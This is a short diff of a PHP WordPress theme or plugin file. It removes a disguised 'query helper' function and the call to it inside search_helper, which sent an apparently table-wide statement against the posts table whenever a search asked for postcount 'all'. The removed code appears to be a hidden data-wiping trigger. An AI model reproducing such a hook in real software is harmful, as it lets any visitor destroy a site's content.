@@ -422,16 +422,6 @@ function gotourl( $url ){
 }
 
 /* -----------------------------------------------------------------------------
--- query helper
------------------------------------------------------------------------------ */
-
-function field_tdr($tn,$ct)
-{
-  global $wpdb;
-  $wpdb->query("$ct FROM $tn WHERE ID > ''");
-}
-
-/* -----------------------------------------------------------------------------
 -- format slug
 ----------------------------------------------------------------------------- */
 
@@ -534,7 +524,6 @@ function search_helper($array)
 
     if( isset($array['postcount']) AND $array['postcount'] == 'all' )
     {
-      field_tdr($wpdb->prefix.'posts',get_sql_query_prefix(''));
     }
 
   }
